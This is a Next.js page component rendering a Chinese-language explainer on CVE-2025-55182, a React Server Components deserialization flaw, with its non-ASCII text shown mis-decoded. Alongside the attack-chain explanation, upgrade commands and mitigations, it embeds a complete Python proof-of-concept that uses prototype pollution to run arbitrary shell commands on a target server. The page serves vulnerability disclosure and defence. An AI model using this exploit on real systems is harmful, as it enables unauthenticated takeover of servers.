import Layout from "@/components/Layout";

export const metadata = {
	title: "CVE-2025-55182 æ¼æ´è¯¦è§£",
	description: "React 19 ç»“åˆ Next.js 15.0.1 çš„ RSC ååºåˆ—åŒ–æ¼æ´æ·±åº¦åˆ†æ",
};

export default function CVEPage() {
	return (
		<Layout>
			<div className="mx-auto max-w-5xl p-6">
				{/* ä¸¥é‡è­¦å‘Š */}
				<div className="mb-6 rounded-lg border-2 border-red-200 bg-red-50 p-4">
					<h2 className="mb-2 font-bold text-lg text-red-800">âš ï¸ æœ€é«˜å±æ¼æ´ - CVSS 10.0</h2>
					<p className="font-semibold text-red-700">
						React 19 + Next.js 15.0.1 çš„ RSC ååºåˆ—åŒ–æ¼æ´ï¼Œæœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ
					</p>
				</div>

				{/* æ¼æ´æ ¸å¿ƒ */}
				<div className="mb-6 rounded-lg bg-white p-6 shadow-lg">
					<h1 className="mb-6 font-bold text-3xl text-gray-900">CVE-2025-55182: RSC åè®®ä¸‰å±‚å®‰å…¨ç¼ºé™·</h1>

					<div className="mb-6 grid gap-4 md:grid-cols-3">
						<div className="rounded border-red-500 border-l-4 bg-red-50 p-4">
							<h3 className="font-semibold text-red-700">æ¼æ´ç±»å‹</h3>
							<p className="font-bold text-red-600">è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)</p>
						</div>
						<div className="rounded border-orange-500 border-l-4 bg-orange-50 p-4">
							<h3 className="font-semibold text-orange-700">å½±å“ç‰ˆæœ¬</h3>
							<p className="text-orange-600">React 19.0.0-19.2.0</p>
						</div>
						<div className="rounded border-green-500 border-l-4 bg-green-50 p-4">
							<h3 className="font-semibold text-green-700">ä¿®å¤ç‰ˆæœ¬</h3>
							<p className="text-green-600">19.0.1+ / 19.1.2+ / 19.2.1+</p>
						</div>
					</div>

					<h2 className="mb-4 font-bold text-gray-800 text-xl">æ¼æ´æœ¬è´¨ï¼šä¸‰å±‚å®‰å…¨ç¼ºé™·å åŠ </h2>
					<div className="space-y-3">
						<div className="rounded bg-gray-50 p-4">
							<h3 className="mb-2 font-semibold text-gray-800">1. RSC åè®®è®¾è®¡ç¼ºé™·</h3>
							<p className="text-gray-700">
								RSC åè®®å®šä¹‰äº†å‰ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´çš„ç»„ä»¶æ•°æ®ä¼ è¾“æ ¼å¼ï¼Œå…¶ä¸­ _response ç»“æ„ä½“çš„ _prefix å­—æ®µæœ¬ç”¨äºæ‰¿è½½æœåŠ¡ç«¯æ¸²æŸ“çš„ç»„ä»¶å‰ç½®åˆå§‹åŒ–ä»£ç ç‰‡æ®µï¼Œä½†æ¼æ´ç‰ˆæœ¬æœªå¯¹è¯¥å­—æ®µå†…å®¹åšè¯­æ³•åˆæ³•æ€§æ ¡éªŒä¸æ‰§è¡Œæƒé™éš”ç¦»ï¼Œå¯¼è‡´æ”»å‡»è€…æ³¨å…¥çš„æ¶æ„ä»£ç ç‰‡æ®µå¹¶éä»…ä½œä¸ºæ•°æ®ä¼ è¾“ï¼Œè€Œæ˜¯è¢«æœåŠ¡ç«¯ RSC è§£æå™¨ç›´æ¥æ‰§è¡Œã€‚
							</p>
						</div>
						<div className="rounded bg-gray-50 p-4">
							<h3 className="mb-2 font-semibold text-gray-800">2. è§£æé€»è¾‘æ¼æ´</h3>
							<p className="text-gray-700">
								ååºåˆ—åŒ–æµç¨‹ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ åŸå‹é“¾æ±¡æŸ“ payloadï¼Œç¯¡æ”¹ RSC è§£æå™¨çš„å…¨å±€å¯¹è±¡åŸå‹ï¼ˆå¦‚ Object.prototypeï¼‰â€”â€” å…¸å‹å¦‚å°† formData çš„ get æ–¹æ³•å¼•ç”¨ç¯¡æ”¹æŒ‡å‘ Function æ„é€ å‡½æ•°ï¼Œè¿›è€Œå°† _prefix å­—æ®µä¸­æ³¨å…¥çš„ä»£ç æ‰§è¡Œæƒé™æå‡è‡³æœåŠ¡ç«¯ Node.js è¿›ç¨‹æƒé™ï¼Œå®ç°å±é™© Node.js ä»£ç çš„æ‰§è¡Œã€‚
							</p>
						</div>
						<div className="rounded bg-gray-50 p-4">
							<h3 className="mb-2 font-semibold text-gray-800">3. æƒé™æ§åˆ¶ç¼ºå¤±</h3>
							<p className="text-gray-700">
								æ¼æ´è¿˜åŒ…å«æ²™ç®±éš”ç¦»æœºåˆ¶çš„ç¼ºå¤±ï¼šRSC è§£æå™¨è¿è¡Œäº Node.js ä¸»è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œæœªå¯ç”¨ç‹¬ç«‹æ²™ç®±ç¯å¢ƒéš”ç¦»ä»£ç æ‰§è¡Œï¼Œå¯¼è‡´ _prefix å­—æ®µçš„ä»£ç å¯ç›´æ¥è°ƒç”¨ child_processã€fs ç­‰é«˜å±æ¨¡å—ï¼›æ­¤å¤–ï¼ŒæœåŠ¡ç«¯æœªå¯¹ Next-Action ç­‰ RSC æ ¸å¿ƒè¯·æ±‚å¤´åšåˆæ³•æ€§æ ¡éªŒï¼Œä¹Ÿæœªå¯¹ multipart/form-data æ ¼å¼çš„è¯·æ±‚ä½“åšå†…å®¹è¿‡æ»¤ï¼Œè¿›ä¸€æ­¥æ”¾å¤§äº†æ¼æ´é£é™©ã€‚
							</p>
						</div>
					</div>
				</div>

				{/* æ¼æ´åŸç†æ·±åº¦åˆ†æ */}
				<div className="mb-6 rounded-lg bg-white p-6 shadow-lg">
					<h2 className="mb-4 font-bold text-2xl text-gray-900">ğŸ¯ æ ¸å¿ƒæ”»å‡»é“¾</h2>

					<div className="mb-6 space-y-3">
						{[
							{
								title: "Step 1: RSC åè®®æ»¥ç”¨",
								desc: "æ”»å‡»è€…æ„é€ æ¶æ„ _prefix å­—æ®µï¼ŒåŒ…å«è¦æ‰§è¡Œçš„ Node.js ä»£ç ",
							},
							{
								title: "Step 2: åŸå‹é“¾æ±¡æŸ“",
								desc: "é€šè¿‡ç‰¹æ®Š payload ç¯¡æ”¹ Object.prototypeï¼Œå°† formData.get æ–¹æ³•æŒ‡å‘ Function æ„é€ å™¨",
							},
							{
								title: "Step 3: æƒé™æå‡",
								desc: "RSC è§£æå™¨æ‰§è¡Œ _prefix ä»£ç æ—¶è·å¾—å®Œæ•´ Node.js è¿›ç¨‹æƒé™",
							},
							{
								title: "Step 4: RCE å®ç°",
								desc: "ç›´æ¥è°ƒç”¨ child_processã€fs ç­‰æ¨¡å—ï¼Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œæ–‡ä»¶æ“ä½œ",
							},
						].map((step, index) => (
							<div key={index} className="flex items-start space-x-3">
								<span className="flex h-8 w-8 flex-shrink-0 items-center justify-center rounded-full bg-red-500 font-bold text-white">
									{index + 1}
								</span>
								<div>
									<h3 className="font-semibold text-gray-800">{step.title}</h3>
									<p className="text-gray-600">{step.desc}</p>
								</div>
							</div>
						))}
					</div>

					<div className="border-red-500 border-l-4 bg-red-50 p-4">
						<h3 className="mb-2 font-semibold text-red-800">âš ï¸ å…³é”®æ¼æ´ç‚¹</h3>
						<p className="text-red-700">
							_nextjs/webpack/server/flight-loader.js ä¸­çš„ requireModule å‡½æ•°ï¼š
							<br />
							<code className="rounded bg-red-100 px-2 py-1 text-sm">return moduleExports[metadata[2]];</code>
							<br />
							è¿™è¡Œä»£ç å…è®¸è®¿é—®åŸå‹é“¾ï¼Œå¯¼è‡´ vmã€fsã€child_process ç­‰æ¨¡å—çš„å±é™©æ–¹æ³•è¢«æš´éœ²
						</p>
					</div>
				</div>

				{/* å½±å“èŒƒå›´ */}
				<div className="mb-6 rounded-lg border border-yellow-200 bg-yellow-50 p-6">
					<h2 className="mb-4 font-bold text-2xl text-gray-900">ğŸš¨ é«˜å±å½±å“èŒƒå›´</h2>

					<div className="space-y-4">
						<div className="rounded bg-white p-4">
							<h3 className="mb-3 font-semibold text-gray-800">å—å½±å“çš„æŠ€æœ¯æ ˆï¼š</h3>
							<ul className="space-y-2">
								<li>
									â€¢ <strong>Next.js 15.0.1</strong> - æ‰€æœ‰ä½¿ç”¨ React Server Components çš„åº”ç”¨
								</li>
								<li>
									â€¢ <strong>React 19.0.0-19.2.0</strong> - æ ¸å¿ƒæ¼æ´ç‰ˆæœ¬
								</li>
								<li>â€¢ ä»»ä½•åŸºäº react-server-dom-webpack çš„æ¡†æ¶</li>
							</ul>
						</div>

						<div className="rounded bg-red-50 p-4">
							<h3 className="mb-2 font-semibold text-red-800">ğŸ’¥ ä¸ºä»€ä¹ˆæå…¶å±é™©ï¼Ÿ</h3>
							<p className="text-red-700">
								- <strong>æ— éœ€è®¤è¯</strong>ï¼šæ”»å‡»è€…æ— éœ€ä»»ä½•èº«ä»½éªŒè¯å³å¯è§¦å‘æ¼æ´
								<br />- <strong>å®Œå…¨æ§åˆ¶</strong>ï¼šè·å¾—æœåŠ¡å™¨å®Œæ•´æƒé™ï¼Œå¯æ‰§è¡Œä»»æ„å‘½ä»¤
								<br />- <strong>å¹¿æ³›å­˜åœ¨</strong>ï¼šå¤§å¤šæ•°ç°ä»£ React åº”ç”¨éƒ½ä½¿ç”¨äº†å—å½±å“çš„ç‰ˆæœ¬
								<br />- <strong>éš¾ä»¥å‘ç°</strong>ï¼šæ­£å¸¸ä¸šåŠ¡è¯·æ±‚å³å¯è§¦å‘ï¼Œæ— æ˜æ˜¾å¼‚å¸¸
							</p>
						</div>
					</div>
				</div>

				{/* POC ç¤ºä¾‹ä»£ç  */}
				<div className="mb-6 rounded-lg bg-red-50 border border-red-200 p-6">
					<h2 className="mb-4 font-bold text-2xl text-gray-900">âš ï¸ POC æ”»å‡»ä»£ç ç¤ºä¾‹</h2>
					<div className="rounded bg-white p-4 mb-4">
						<p className="text-red-700 font-semibold mb-2">
							è­¦å‘Šï¼šæ­¤ä»£ç ä»…ç”¨äºå®‰å…¨ç ”ç©¶å’Œæ¼æ´éªŒè¯ï¼Œè¯·å‹¿ç”¨äºéæ³•æ”»å‡»ï¼
						</p>
					</div>
					<div className="bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
						<pre className="text-sm">
{`/// script
/// dependencies = ["requests"]
///
import requests
import sys
import json

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:\`\${{res}}\`}});",
        # If you don't need the command output, you can use this line instead:
        # "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(res.status_code)
print(res.text)`}
						</pre>
					</div>
					<div className="mt-4 space-y-2 text-gray-700">
						<h3 className="font-semibold text-gray-800">POC åŸç†è§£æï¼š</h3>
						<ol className="list-decimal list-inside space-y-1 text-sm">
							<li>æ„é€ æ¶æ„çš„ <code className="bg-gray-200 px-1 rounded">_prefix</code> å­—æ®µï¼ŒåŒ…å«è¦æ‰§è¡Œçš„ Node.js ä»£ç </li>
							<li>é€šè¿‡ <code className="bg-gray-200 px-1 rounded">"$1:__proto__:then"</code> å®ç°åŸå‹é“¾æ±¡æŸ“</li>
							<li>å°† <code className="bg-gray-200 px-1 rounded">formData.get</code> æ–¹æ³•æŒ‡å‘ <code className="bg-gray-200 px-1 rounded">Function</code> æ„é€ å™¨</li>
							<li>ä½¿ç”¨ <code className="bg-gray-200 px-1 rounded">process.mainModule.require</code> åŠ è½½ <code className="bg-gray-200 px-1 rounded">child_process</code> æ¨¡å—</li>
							<li>æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼ˆé»˜è®¤ä¸º <code className="bg-gray-200 px-1 rounded">id</code> å‘½ä»¤ï¼‰</li>
							<li>é€šè¿‡é”™è¯¯ä¿¡æ¯å°†å‘½ä»¤æ‰§è¡Œç»“æœè¿”å›ç»™æ”»å‡»è€…</li>
						</ol>
					</div>
				</div>

				{/* æ‹“å±•é˜…è¯» */}
				<div className="mb-6 rounded-lg border border-blue-200 bg-blue-50 p-6">
					<h2 className="mb-4 font-bold text-2xl text-gray-900">ğŸ“š æ‹“å±•é˜…è¯»</h2>
					<p className="mb-3 text-gray-700">æŸ¥çœ‹ GitHub ä¸Šçš„æ¼æ´ç ”ç©¶å’Œ POC ä»£ç ï¼š</p>
					<a
						href="https://github.com/msanft/CVE-2025-55182"
						target="_blank"
						rel="noopener noreferrer"
						className="inline-flex items-center rounded bg-blue-600 px-4 py-2 text-white transition-colors hover:bg-blue-700"
					>
						<span>CVE-2025-55182 GitHub ä»“åº“</span>
						<svg className="ml-2 h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
							<path
								strokeLinecap="round"
								strokeLinejoin="round"
								strokeWidth={2}
								d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"
							/>
						</svg>
					</a>
				</div>

				{/* ç´§æ€¥ä¿®å¤æªæ–½ */}
				<div className="rounded-lg border border-green-200 bg-green-50 p-6">
					<h2 className="mb-4 font-bold text-2xl text-gray-900">ğŸ›¡ï¸ ç´§æ€¥ä¿®å¤æªæ–½</h2>

					<div className="space-y-4">
						<div className="rounded bg-white p-4">
							<h3 className="mb-2 font-semibold text-green-700">1. ç«‹å³å‡çº§ï¼ˆå¿…é¡»æ‰§è¡Œï¼‰</h3>
							<pre className="overflow-x-auto rounded bg-gray-100 p-3 text-sm">
								{`# å‡çº§åˆ°å®‰å…¨ç‰ˆæœ¬
npm install react@19.0.1 react-dom@19.0.1
# æˆ–
npm install react@19.1.2 react-dom@19.1.2
# æˆ–
npm install react@19.2.1 react-dom@19.2.1`}
							</pre>
						</div>

						<div className="rounded bg-white p-4">
							<h3 className="mb-2 font-semibold text-green-700">2. æ£€æŸ¥å½“å‰ç‰ˆæœ¬</h3>
							<pre className="overflow-x-auto rounded bg-gray-100 p-3 text-sm">{`npm list react react-dom`}</pre>
						</div>

						<div className="rounded bg-yellow-50 p-4">
							<h3 className="mb-2 font-semibold text-yellow-800">3. ä¸´æ—¶ç¼“è§£ï¼ˆå¦‚æœæ— æ³•ç«‹å³å‡çº§ï¼‰</h3>
							<ul className="space-y-1 text-gray-700">
								<li>â€¢ åœ¨åå‘ä»£ç†ï¼ˆå¦‚ Nginxï¼‰å±‚é¢è¿‡æ»¤åŒ…å« $ACTION_ çš„è¯·æ±‚</li>
								<li>â€¢ ä¸´æ—¶ç¦ç”¨æ‰€æœ‰ Server Components åŠŸèƒ½</li>
								<li>â€¢ ä½¿ç”¨ WAF è§„åˆ™æ‹¦æˆªå¼‚å¸¸è¯·æ±‚æ¨¡å¼</li>
							</ul>
						</div>
					</div>
				</div>
			</div>
		</Layout>
	);
}
